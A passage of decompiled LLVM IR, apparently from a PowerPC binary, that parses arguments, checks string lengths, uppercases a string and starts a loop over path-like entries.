  %v3_1000025c = inttoptr i32 %v2_1000025c to i32*
  store i32 %v0_1000025c, i32* %v3_1000025c, align 4
  store i32 268435604, i32* %r4.global-to-local, align 4
  store i32 268435604, i32* %r28.global-to-local, align 4
  store i32 %v0_10000240, i32* %r23.global-to-local, align 4
  store i32 %v2_10000214, i32* %r3.global-to-local, align 4
  %v0_10000274 = load i32, i32* %r0.global-to-local, align 4
  %v1_10000274 = load i32, i32* @r1, align 4
  %v2_10000274 = add i32 %v1_10000274, 20900
  %v3_10000274 = inttoptr i32 %v2_10000274 to i32*
  store i32 %v0_10000274, i32* %v3_10000274, align 4
  %v1_10000278 = load i32, i32* @r1, align 4
  %v2_10000278 = add i32 %v1_10000278, 20820
  %v3_10000278 = inttoptr i32 %v2_10000278 to i32*
  store i32 %v0_10000240, i32* %v3_10000278, align 4
  %v0_1000027c = load i32, i32* @r20, align 4
  %v1_1000027c = load i32, i32* @r1, align 4
  %v2_1000027c = add i32 %v1_1000027c, 20848
  %v3_1000027c = inttoptr i32 %v2_1000027c to i32*
  store i32 %v0_1000027c, i32* %v3_1000027c, align 4
  %v0_10000280 = load i32, i32* @r1, align 4
  %v1_10000280 = add i32 %v0_10000280, 10540
  store i32 %v1_10000280, i32* %r20.global-to-local, align 4
  %v0_10000284 = load i32, i32* @r25, align 4
  %v2_10000284 = add i32 %v0_10000280, 20868
  %v3_10000284 = inttoptr i32 %v2_10000284 to i32*
  store i32 %v0_10000284, i32* %v3_10000284, align 4
  %v0_10000288 = load i32, i32* @r26, align 4
  %v1_10000288 = load i32, i32* @r1, align 4
  %v2_10000288 = add i32 %v1_10000288, 20872
  %v3_10000288 = inttoptr i32 %v2_10000288 to i32*
  store i32 %v0_10000288, i32* %v3_10000288, align 4
  %v0_1000028c = load i32, i32* @r27, align 4
  %v1_1000028c = load i32, i32* @r1, align 4
  %v2_1000028c = add i32 %v1_1000028c, 20876
  %v3_1000028c = inttoptr i32 %v2_1000028c to i32*
  store i32 %v0_1000028c, i32* %v3_1000028c, align 4
  %v0_10000290 = load i32, i32* @r31, align 4
  %v1_10000290 = load i32, i32* @r1, align 4
  %v2_10000290 = add i32 %v1_10000290, 20892
  %v3_10000290 = inttoptr i32 %v2_10000290 to i32*
  store i32 %v0_10000290, i32* %v3_10000290, align 4
  %v0_10000294 = load i32, i32* %r14.global-to-local, align 4
  %v1_10000294 = load i32, i32* @r1, align 4
  %v2_10000294 = add i32 %v1_10000294, 20824
  %v3_10000294 = inttoptr i32 %v2_10000294 to i32*
  store i32 %v0_10000294, i32* %v3_10000294, align 4
  %v0_10000298 = load i32, i32* %r15.global-to-local, align 4
  %v1_10000298 = load i32, i32* @r1, align 4
  %v2_10000298 = add i32 %v1_10000298, 20828
  %v3_10000298 = inttoptr i32 %v2_10000298 to i32*
  store i32 %v0_10000298, i32* %v3_10000298, align 4
  %v0_1000029c = load i32, i32* %r16.global-to-local, align 4
  %v1_1000029c = load i32, i32* @r1, align 4
  %v2_1000029c = add i32 %v1_1000029c, 20832
  %v3_1000029c = inttoptr i32 %v2_1000029c to i32*
  store i32 %v0_1000029c, i32* %v3_1000029c, align 4
  %v0_100002a0 = load i32, i32* %r17.global-to-local, align 4
  %v1_100002a0 = load i32, i32* @r1, align 4
  %v2_100002a0 = add i32 %v1_100002a0, 20836
  %v3_100002a0 = inttoptr i32 %v2_100002a0 to i32*
  store i32 %v0_100002a0, i32* %v3_100002a0, align 4
  %v0_100002a4 = load i32, i32* %r18.global-to-local, align 4
  %v1_100002a4 = load i32, i32* @r1, align 4
  %v2_100002a4 = add i32 %v1_100002a4, 20840
  %v3_100002a4 = inttoptr i32 %v2_100002a4 to i32*
  store i32 %v0_100002a4, i32* %v3_100002a4, align 4
  %v0_100002a8 = load i32, i32* %r19.global-to-local, align 4
  %v1_100002a8 = load i32, i32* @r1, align 4
  %v2_100002a8 = add i32 %v1_100002a8, 20844
  %v3_100002a8 = inttoptr i32 %v2_100002a8 to i32*
  store i32 %v0_100002a8, i32* %v3_100002a8, align 4
  %v0_100002ac = load i32, i32* @r21, align 4
  %v1_100002ac = load i32, i32* @r1, align 4
  %v2_100002ac = add i32 %v1_100002ac, 20852
  %v3_100002ac = inttoptr i32 %v2_100002ac to i32*
  store i32 %v0_100002ac, i32* %v3_100002ac, align 4
  %v0_100002b0 = load i32, i32* @r24, align 4
  %v1_100002b0 = load i32, i32* @r1, align 4
  %v2_100002b0 = add i32 %v1_100002b0, 20864
  %v3_100002b0 = inttoptr i32 %v2_100002b0 to i32*
  store i32 %v0_100002b0, i32* %v3_100002b0, align 4
  %v0_100002b4 = load i32, i32* @r30, align 4
  %v1_100002b4 = load i32, i32* @r1, align 4
  %v2_100002b4 = add i32 %v1_100002b4, 20888
  %v3_100002b4 = inttoptr i32 %v2_100002b4 to i32*
  store i32 %v0_100002b4, i32* %v3_100002b4, align 4
  store i32 268436156, i32* @lr, align 4
  %v5_100002b8 = call i32 @function_10001d50(i32 %v2_10000214, i32* inttoptr (i32 268435604 to i32*), i32 21, i32 0)
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v1_100002c0 = load i32, i32* @r1, align 4
  %v2_100002c0 = add i32 %v1_100002c0, 20804
  %v3_100002c0 = inttoptr i32 %v2_100002c0 to i32*
  store i32 %v5_100002b8, i32* %v3_100002c0, align 4
  %v0_100002cc = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100002cc, i32* %r4.global-to-local, align 4
  store i32 %v2_10000214, i32* %r3.global-to-local, align 4
  store i32 268436184, i32* @lr, align 4
  %v5_100002d4 = inttoptr i32 %v0_100002cc to i32*
  %v6_100002d4 = call i32 @function_10001d50(i32 %v2_10000214, i32* %v5_100002d4, i32 20, i32 ptrtoint ([4 x i8]* @global_var_1000a7b8.7 to i32))
  %v0_100002d8 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100002d8, i32* %r4.global-to-local, align 4
  store i32 %v6_100002d4, i32* %r25.global-to-local, align 4
  store i32 %v2_10000214, i32* %r3.global-to-local, align 4
  store i32 268436208, i32* @lr, align 4
  %v4_100002ec = inttoptr i32 %v0_100002d8 to i32*
  %v5_100002ec = call i32 @function_10001d50(i32 %v2_10000214, i32* %v4_100002ec, i32 8, i32 0)
  store i32 %v5_100002ec, i32* %r26.global-to-local, align 4
  %v0_10000300 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10000300, i32* %r4.global-to-local, align 4
  store i32 %v2_10000214, i32* %r3.global-to-local, align 4
  store i32 268436236, i32* @lr, align 4
  %v4_10000308 = inttoptr i32 %v0_10000300 to i32*
  %v5_10000308 = call i32 @function_10001d50(i32 %v2_10000214, i32* %v4_10000308, i32 22, i32 ptrtoint (i32* @global_var_1000a7bc.8 to i32))
  %v0_1000030c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000030c, i32* %r4.global-to-local, align 4
  store i32 %v5_10000308, i32* %r27.global-to-local, align 4
  store i32 %v2_10000214, i32* %r3.global-to-local, align 4
  store i32 268436260, i32* @lr, align 4
  %v4_10000320 = inttoptr i32 %v0_1000030c to i32*
  %v5_10000320 = call i32 @function_100021c0(i32 %v2_10000214, i32* %v4_10000320, i32 24, i32 1)
  %v0_10000324 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10000324, i32* %r4.global-to-local, align 4
  store i32 %v5_10000320, i32* %r31.global-to-local, align 4
  store i32 %v2_10000214, i32* %r3.global-to-local, align 4
  store i32 268436284, i32* @lr, align 4
  %v4_10000338 = inttoptr i32 %v0_10000324 to i32*
  %v5_10000338 = call i32 @function_100021c0(i32 %v2_10000214, i32* %v4_10000338, i32 7, i32 80)
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_10000340 = urem i32 %v5_10000338, 65536
  %v1_10000348 = load i32, i32* @r1, align 4
  %v2_10000348 = add i32 %v1_10000348, 20800
  %v3_10000348 = inttoptr i32 %v2_10000348 to i32*
  store i32 %v1_10000340, i32* %v3_10000348, align 4
  %v0_1000034c = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_1000034c, i32* %r3.global-to-local, align 4
  store i32 268436308, i32* @lr, align 4
  %v3_10000350 = call i32 @function_10008608(i32 %v0_1000034c, i32 0, i32 10241)
  store i32 %v3_10000350, i32* %r3.global-to-local, align 4
  %v0_10000354 = load i32, i32* %r26.global-to-local, align 4
  %v1_10000354 = icmp slt i32 %v0_10000354, 0
  %v2_10000354 = icmp sgt i32 %v0_10000354, 0
  %v3_10000354 = icmp eq i32 %v0_10000354, 0
  store i1 %v1_10000354, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000354, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000354, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000354, label %dec_label_pc_10000374, label %dec_label_pc_1000035c

dec_label_pc_1000035c:                            ; preds = %entry
  %v0_1000035c = load i32, i32* %r27.global-to-local, align 4
  %v1_1000035c = icmp slt i32 %v0_1000035c, 0
  %v2_1000035c = icmp sgt i32 %v0_1000035c, 0
  %v3_1000035c = icmp eq i32 %v0_1000035c, 0
  store i1 %v1_1000035c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000035c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000035c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000035c, label %dec_label_pc_10000374, label %dec_label_pc_10000364

dec_label_pc_10000364:                            ; preds = %dec_label_pc_1000035c
  store i32 %v0_1000035c, i32* %r3.global-to-local, align 4
  store i32 268436332, i32* @lr, align 4
  %v1_10000368 = inttoptr i32 %v0_1000035c to i8*
  %v2_10000368 = call i32 @function_100074dc(i8* %v1_10000368)
  store i32 %v2_10000368, i32* %r3.global-to-local, align 4
  %v1_1000036c = icmp slt i32 %v2_10000368, 255
  %v2_1000036c = icmp sgt i32 %v2_10000368, 255
  %v3_1000036c = icmp eq i32 %v2_10000368, 255
  store i1 %v1_1000036c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000036c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000036c, i1* %cr7_eq.global-to-local, align 1
  %tmp65 = icmp slt i32 %v2_10000368, 256
  br i1 %tmp65, label %dec_label_pc_100003d4, label %dec_label_pc_10000374

dec_label_pc_10000374:                            ; preds = %dec_label_pc_100003e4, %dec_label_pc_100003d4, %dec_label_pc_10000364, %dec_label_pc_1000035c, %entry
  %v0_10000374 = load i32, i32* @r1, align 4
  %v1_10000374 = add i32 %v0_10000374, 20900
  %v2_10000374 = inttoptr i32 %v1_10000374 to i32*
  %v3_10000374 = load i32, i32* %v2_10000374, align 4
  store i32 %v3_10000374, i32* %r0.global-to-local, align 4
  %v1_10000378 = add i32 %v0_10000374, 20820
  %v2_10000378 = inttoptr i32 %v1_10000378 to i32*
  %v3_10000378 = load i32, i32* %v2_10000378, align 4
  %v1_1000037c = add i32 %v0_10000374, 20824
  %v2_1000037c = inttoptr i32 %v1_1000037c to i32*
  %v3_1000037c = load i32, i32* %v2_1000037c, align 4
  store i32 %v3_1000037c, i32* %r14.global-to-local, align 4
  store i32 %v3_10000374, i32* %lr.global-to-local, align 4
  %v1_10000384 = add i32 %v0_10000374, 20828
  %v2_10000384 = inttoptr i32 %v1_10000384 to i32*
  %v3_10000384 = load i32, i32* %v2_10000384, align 4
  store i32 %v3_10000384, i32* %r15.global-to-local, align 4
  %v1_10000388 = call %0 @__asm_mtcrf(i32 24, i32 %v3_10000378)
  %v0_1000038c = load i32, i32* @r1, align 4
  %v1_1000038c = add i32 %v0_1000038c, 20832
  %v2_1000038c = inttoptr i32 %v1_1000038c to i32*
  %v3_1000038c = load i32, i32* %v2_1000038c, align 4
  store i32 %v3_1000038c, i32* %r16.global-to-local, align 4
  %v1_10000390 = add i32 %v0_1000038c, 20836
  %v2_10000390 = inttoptr i32 %v1_10000390 to i32*
  %v3_10000390 = load i32, i32* %v2_10000390, align 4
  store i32 %v3_10000390, i32* %r17.global-to-local, align 4
  %v1_10000394 = add i32 %v0_1000038c, 20840
  %v2_10000394 = inttoptr i32 %v1_10000394 to i32*
  %v3_10000394 = load i32, i32* %v2_10000394, align 4
  store i32 %v3_10000394, i32* %r18.global-to-local, align 4
  %v1_10000398 = add i32 %v0_1000038c, 20844
  %v2_10000398 = inttoptr i32 %v1_10000398 to i32*
  %v3_10000398 = load i32, i32* %v2_10000398, align 4
  store i32 %v3_10000398, i32* %r19.global-to-local, align 4
  %v1_1000039c = add i32 %v0_1000038c, 20848
  %v2_1000039c = inttoptr i32 %v1_1000039c to i32*
  %v3_1000039c = load i32, i32* %v2_1000039c, align 4
  store i32 %v3_1000039c, i32* %r20.global-to-local, align 4
  %v1_100003a0 = add i32 %v0_1000038c, 20852
  %v2_100003a0 = inttoptr i32 %v1_100003a0 to i32*
  %v3_100003a0 = load i32, i32* %v2_100003a0, align 4
  store i32 %v3_100003a0, i32* %r21.global-to-local, align 4
  %v1_100003a4 = add i32 %v0_1000038c, 20856
  %v2_100003a4 = inttoptr i32 %v1_100003a4 to i32*
  %v3_100003a4 = load i32, i32* %v2_100003a4, align 4
  store i32 %v3_100003a4, i32* %r22.global-to-local, align 4
  %v1_100003a8 = add i32 %v0_1000038c, 20860
  %v2_100003a8 = inttoptr i32 %v1_100003a8 to i32*
  %v3_100003a8 = load i32, i32* %v2_100003a8, align 4
  store i32 %v3_100003a8, i32* %r23.global-to-local, align 4
  %v1_100003ac = add i32 %v0_1000038c, 20864
  %v2_100003ac = inttoptr i32 %v1_100003ac to i32*
  %v3_100003ac = load i32, i32* %v2_100003ac, align 4
  store i32 %v3_100003ac, i32* %r24.global-to-local, align 4
  %v1_100003b0 = add i32 %v0_1000038c, 20868
  %v2_100003b0 = inttoptr i32 %v1_100003b0 to i32*
  %v3_100003b0 = load i32, i32* %v2_100003b0, align 4
  store i32 %v3_100003b0, i32* %r25.global-to-local, align 4
  %v1_100003b4 = add i32 %v0_1000038c, 20872
  %v2_100003b4 = inttoptr i32 %v1_100003b4 to i32*
  %v3_100003b4 = load i32, i32* %v2_100003b4, align 4
  store i32 %v3_100003b4, i32* %r26.global-to-local, align 4
  %v1_100003b8 = add i32 %v0_1000038c, 20876
  %v2_100003b8 = inttoptr i32 %v1_100003b8 to i32*
  %v3_100003b8 = load i32, i32* %v2_100003b8, align 4
  store i32 %v3_100003b8, i32* %r27.global-to-local, align 4
  %v1_100003bc = add i32 %v0_1000038c, 20880
  %v2_100003bc = inttoptr i32 %v1_100003bc to i32*
  %v3_100003bc = load i32, i32* %v2_100003bc, align 4
  store i32 %v3_100003bc, i32* %r28.global-to-local, align 4
  %v1_100003c0 = add i32 %v0_1000038c, 20884
  %v2_100003c0 = inttoptr i32 %v1_100003c0 to i32*
  %v3_100003c0 = load i32, i32* %v2_100003c0, align 4
  store i32 %v3_100003c0, i32* %r29.global-to-local, align 4
  %v1_100003c4 = add i32 %v0_1000038c, 20888
  %v2_100003c4 = inttoptr i32 %v1_100003c4 to i32*
  %v3_100003c4 = load i32, i32* %v2_100003c4, align 4
  store i32 %v3_100003c4, i32* %r30.global-to-local, align 4
  %v1_100003c8 = add i32 %v0_1000038c, 20892
  %v2_100003c8 = inttoptr i32 %v1_100003c8 to i32*
  %v3_100003c8 = load i32, i32* %v2_100003c8, align 4
  store i32 %v3_100003c8, i32* %r31.global-to-local, align 4
  %v0_100003d0 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100003d0

dec_label_pc_100003d4:                            ; preds = %dec_label_pc_10000364
  %v0_100003d4 = load i32, i32* %r26.global-to-local, align 4
  store i32 %v0_100003d4, i32* %r3.global-to-local, align 4
  store i32 268436444, i32* @lr, align 4
  %v1_100003d8 = inttoptr i32 %v0_100003d4 to i8*
  %v2_100003d8 = call i32 @function_100074dc(i8* %v1_100003d8)
  store i32 %v2_100003d8, i32* %r3.global-to-local, align 4
  %v1_100003dc = icmp slt i32 %v2_100003d8, 127
  %v2_100003dc = icmp sgt i32 %v2_100003d8, 127
  %v3_100003dc = icmp eq i32 %v2_100003d8, 127
  store i1 %v1_100003dc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100003dc, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100003dc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100003dc, label %dec_label_pc_10000374, label %dec_label_pc_100003e4

dec_label_pc_100003e4:                            ; preds = %dec_label_pc_100003d4
  %v0_100003e4 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_100003e4, i32* %r3.global-to-local, align 4
  store i32 268436460, i32* @lr, align 4
  %v1_100003e8 = inttoptr i32 %v0_100003e4 to i8*
  %v2_100003e8 = call i32 @function_100074dc(i8* %v1_100003e8)
  store i32 %v2_100003e8, i32* %r3.global-to-local, align 4
  %v1_100003ec = icmp slt i32 %v2_100003e8, 9
  %v2_100003ec = icmp sgt i32 %v2_100003e8, 9
  %v3_100003ec = icmp eq i32 %v2_100003e8, 9
  store i1 %v1_100003ec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100003ec, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100003ec, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100003ec, label %dec_label_pc_10000374, label %dec_label_pc_100003f4

dec_label_pc_100003f4:                            ; preds = %dec_label_pc_100003e4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_100003f8 = load i32, i32* @r1, align 4
  %v2_100003f8 = add i32 %v1_100003f8, 8
  %v3_100003f8 = inttoptr i32 %v2_100003f8 to i32*
  store i32 0, i32* %v3_100003f8, align 4
  br label %dec_label_pc_100003fc

dec_label_pc_100003fc:                            ; preds = %dec_label_pc_10000430, %dec_label_pc_100003f4
  %v0_100003fc = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_100003fc, i32* %r3.global-to-local, align 4
  store i32 268436484, i32* @lr, align 4
  %v1_10000400 = inttoptr i32 %v0_100003fc to i8*
  %v2_10000400 = call i32 @function_100074dc(i8* %v1_10000400)
  store i32 %v2_10000400, i32* %r3.global-to-local, align 4
  %v0_10000404 = load i32, i32* @r1, align 4
  %v1_10000404 = add i32 %v0_10000404, 8
  %v2_10000404 = inttoptr i32 %v1_10000404 to i32*
  %v3_10000404 = load i32, i32* %v2_10000404, align 4
  store i32 %v3_10000404, i32* %r11.global-to-local, align 4
  %v2_10000408 = icmp slt i32 %v2_10000400, %v3_10000404
  %v3_10000408 = icmp sgt i32 %v2_10000400, %v3_10000404
  %v4_10000408 = icmp eq i32 %v2_10000400, %v3_10000404
  store i1 %v2_10000408, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000408, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_10000408, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000408, label %dec_label_pc_10000410, label %dec_label_pc_1000043c

dec_label_pc_10000410:                            ; preds = %dec_label_pc_100003fc
  %v0_10000410 = load i32, i32* %r25.global-to-local, align 4
  %v2_10000410 = add i32 %v0_10000410, %v3_10000404
  %v3_10000410 = inttoptr i32 %v2_10000410 to i8*
  %v4_10000410 = load i8, i8* %v3_10000410, align 1
  %v5_10000410 = zext i8 %v4_10000410 to i32
  store i32 %v5_10000410, i32* %r9.global-to-local, align 4
  %v1_10000414 = add nuw nsw i32 %v5_10000410, 159
  %v1_10000418 = urem i32 %v1_10000414, 256
  store i32 %v1_10000418, i32* %r0.global-to-local, align 4
  %v1_1000041c = icmp ult i32 %v1_10000418, 25
  %v2_1000041c = icmp ugt i32 %v1_10000418, 25
  %v3_1000041c = icmp eq i32 %v1_10000418, 25
  store i1 %v1_1000041c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000041c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000041c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000041c, label %dec_label_pc_10000430, label %dec_label_pc_10000424

dec_label_pc_10000424:                            ; preds = %dec_label_pc_10000410
  %v1_10000424 = add nsw i32 %v5_10000410, -32
  store i32 %v1_10000424, i32* %r0.global-to-local, align 4
  %v3_10000428 = trunc i32 %v1_10000424 to i8
  store i8 %v3_10000428, i8* %v3_10000410, align 1
  %v0_1000042c = load i32, i32* @r1, align 4
  %v1_1000042c = add i32 %v0_1000042c, 8
  %v2_1000042c = inttoptr i32 %v1_1000042c to i32*
  %v3_1000042c = load i32, i32* %v2_1000042c, align 4
  store i32 %v3_1000042c, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10000430

dec_label_pc_10000430:                            ; preds = %dec_label_pc_10000410, %dec_label_pc_10000424
  %v1_10000434 = phi i32 [ %v0_10000404, %dec_label_pc_10000410 ], [ %v0_1000042c, %dec_label_pc_10000424 ]
  %v0_10000430 = phi i32 [ %v3_10000404, %dec_label_pc_10000410 ], [ %v3_1000042c, %dec_label_pc_10000424 ]
  %v1_10000430 = add i32 %v0_10000430, 1
  store i32 %v1_10000430, i32* %r11.global-to-local, align 4
  %v2_10000434 = add i32 %v1_10000434, 8
  %v3_10000434 = inttoptr i32 %v2_10000434 to i32*
  store i32 %v1_10000430, i32* %v3_10000434, align 4
  br label %dec_label_pc_100003fc

dec_label_pc_1000043c:                            ; preds = %dec_label_pc_100003fc
  %v0_1000043c = load i32, i32* %r31.global-to-local, align 4
  %v1_1000043c = icmp slt i32 %v0_1000043c, 256
  %v2_1000043c = icmp sgt i32 %v0_1000043c, 256
  %v3_1000043c = icmp eq i32 %v0_1000043c, 256
  store i1 %v1_1000043c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000043c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000043c, i1* %cr7_eq.global-to-local, align 1
  %v0_10000440. = select i1 %v2_1000043c, i32 256, i32 %v0_1000043c
  store i32 %v0_10000440., i32* %r21.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v1_10000450 = icmp slt i32 %v0_10000440., 0
  %v3_10000450 = icmp eq i32 %v0_10000440., 0
  store i1 %v1_10000450, i1* %cr4_lt.global-to-local, align 1
  store i1 %v3_10000450, i1* %cr4_eq.global-to-local, align 1
  store i32 ptrtoint ([3 x i8]* @global_var_10000458.9 to i32), i32* @lr, align 4
  %v1_10000454 = call i32 @function_10006c64(i32 36)
  store i32 37, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000460.10 to i32), i32* @lr, align 4
  %v1_1000045c = call i32 @function_10006c64(i32 37)
  store i32 38, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000468.11 to i32), i32* @lr, align 4
  %v1_10000464 = call i32 @function_10006c64(i32 38)
  store i32 39, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000470.12 to i32), i32* @lr, align 4
  %v1_1000046c = call i32 @function_10006c64(i32 39)
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000478.13 to i32), i32* @lr, align 4
  %v1_10000474 = call i32 @function_10006c64(i32 40)
  store i32 41, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000480.14 to i32), i32* @lr, align 4
  %v1_1000047c = call i32 @function_10006c64(i32 41)
  store i32 42, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000488.15 to i32), i32* @lr, align 4
  %v1_10000484 = call i32 @function_10006c64(i32 42)
  store i32 43, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000490.16 to i32), i32* @lr, align 4
  %v1_1000048c = call i32 @function_10006c64(i32 43)
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000498.17 to i32), i32* @lr, align 4
  %v1_10000494 = call i32 @function_10006c64(i32 44)
  store i32 45, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100004a0.18 to i32), i32* @lr, align 4
  %v1_1000049c = call i32 @function_10006c64(i32 45)
  store i32 46, i32* %r3.global-to-local, align 4
  store i32 268436648, i32* @lr, align 4
  %v1_100004a4 = call i32 @function_10006c64(i32 46)
  %v0_100004a8 = load i32, i32* %r21.global-to-local, align 4
  store i32 %v0_100004a8, i32* %r3.global-to-local, align 4
  store i32 3140, i32* %r4.global-to-local, align 4
  store i32 268436660, i32* @lr, align 4
  %v2_100004b0 = call i32 @function_10008ec0(i32 %v0_100004a8, i32 3140)
  store i32 %v2_100004b0, i32* %r3.global-to-local, align 4
  %v1_100004b4 = load i32, i32* @r1, align 4
  %v2_100004b4 = add i32 %v1_100004b4, 20796
  %v3_100004b4 = inttoptr i32 %v2_100004b4 to i32*
  store i32 %v2_100004b0, i32* %v3_100004b4, align 4
  %v0_100004b8 = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_100004b8 = load i1, i1* %cr4_lt.global-to-local, align 1
  %v2_100004b8 = or i1 %v0_100004b8, %v1_100004b8
  br i1 %v2_100004b8, label %dec_label_pc_100005b4, label %dec_label_pc_100004bc

dec_label_pc_100004bc:                            ; preds = %dec_label_pc_1000043c
  store i32 %v2_100004b0, i32* @r31, align 4
  store i32 0, i32* %r28.global-to-local, align 4
  store i32 268500992, i32* %r19.global-to-local, align 4
  br label %dec_label_pc_100004c8

dec_label_pc_100004c8:                            ; preds = %dec_label_pc_10001c70.dec_label_pc_100004c8_crit_edge, %dec_label_pc_100004bc
  %v2_100004d4 = phi i32 [ %v2_100004d4.pre, %dec_label_pc_10001c70.dec_label_pc_100004c8_crit_edge ], [ %v2_100004b0, %dec_label_pc_100004bc ]
  %v0_100004c8 = phi i32 [ %v1_10001c84, %dec_label_pc_10001c70.dec_label_pc_100004c8_crit_edge ], [ 0, %dec_label_pc_100004bc ]
  %v1_100004c8 = load i32, i32* %r23.global-to-local, align 4
  %v2_100004c8 = sdiv i32 %v0_100004c8, %v1_100004c8
  store i32 %v2_100004c8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 -1, i32* %r11.global-to-local, align 4
  %v3_100004d4 = add i32 %v2_100004d4, 4
  %v4_100004d4 = inttoptr i32 %v3_100004d4 to i8*
  store i8 0, i8* %v4_100004d4, align 1
  %v0_100004d8 = load i32, i32* %r11.global-to-local, align 4
  %v1_100004d8 = load i32, i32* @r31, align 4
  %v2_100004d8 = inttoptr i32 %v1_100004d8 to i32*
  store i32 %v0_100004d8, i32* %v2_100004d8, align 4
  %v0_100004dc = load i32, i32* @r31, align 4
  %v1_100004dc = add i32 %v0_100004dc, 532
  store i32 %v1_100004dc, i32* %r24.global-to-local, align 4
  store i32 %v1_100004dc, i32* @r3, align 4
  %v0_100004e4 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_100004e4, i32* %r4.global-to-local, align 4
  %v0_100004e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100004e8 = load i32, i32* %r23.global-to-local, align 4
  %v2_100004e8 = mul i32 %v1_100004e8, %v0_100004e8
  %v1_100004ec = load i32, i32* %r28.global-to-local, align 4
  %v2_100004ec = sub i32 %v1_100004ec, %v2_100004e8
  %v1_100004f0 = mul i32 %v2_100004ec, 24
  store i32 %v1_100004f0, i32* %r0.global-to-local, align 4
  %v1_100004f4 = load i32, i32* %r22.global-to-local, align 4
  %v2_100004f4 = add i32 %v1_100004f4, %v1_100004f0
  store i32 %v2_100004f4, i32* %r30.global-to-local, align 4
  %v1_100004f8 = add i32 %v2_100004f4, 16
  %v2_100004f8 = inttoptr i32 %v1_100004f8 to i32*
  %v3_100004f8 = load i32, i32* %v2_100004f8, align 4
  store i32 %v3_100004f8, i32* %r9.global-to-local, align 4
  %v2_100004fc = add i32 %v0_100004dc, 16
  %v3_100004fc = inttoptr i32 %v2_100004fc to i32*
  store i32 %v3_100004f8, i32* %v3_100004fc, align 4
  store i32 268436740, i32* %lr.global-to-local, align 4
  %v2_10000500 = inttoptr i32 %v1_100004dc to i8*
  %v3_10000500 = call i32 @function_10007504(i8* %v2_10000500, i32 %v0_100004e4)
  store i32 %v3_10000500, i32* %r3.global-to-local, align 4
  %v0_10000504 = load i32, i32* @r31, align 4
  %v1_10000504 = add i32 %v0_10000504, 532
  %v2_10000504 = inttoptr i32 %v1_10000504 to i8*
  %v3_10000504 = load i8, i8* %v2_10000504, align 1
  %v4_10000504 = zext i8 %v3_10000504 to i32
  store i32 %v4_10000504, i32* %r0.global-to-local, align 4
  %v1_10000508 = icmp ult i8 %v3_10000504, 47
  %v2_10000508 = icmp ugt i8 %v3_10000504, 47
  %v3_10000508 = icmp eq i8 %v3_10000504, 47
  store i1 %v1_10000508, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000508, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000508, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000508, label %dec_label_pc_10000530, label %dec_label_pc_10000510

dec_label_pc_10000510:                            ; preds = %dec_label_pc_100004c8
  %v0_10000510 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000510, i32* %r3.global-to-local, align 4
  store i32 268436760, i32* @lr, align 4
  %v1_10000514 = inttoptr i32 %v0_10000510 to i8*
  %v2_10000514 = call i32 @function_100074dc(i8* %v1_10000514)
  %v0_10000518 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000518, i32* %r4.global-to-local, align 4
  %v0_10000520 = load i32, i32* @r31, align 4
  %v1_10000520 = add i32 %v0_10000520, 533
  store i32 %v1_10000520, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10000528.19 to i32), i32* @lr, align 4
  %v3_10000524 = call i32 @function_10008564(i32 %v1_10000520, i32 %v0_10000518, i32 %v2_10000514)
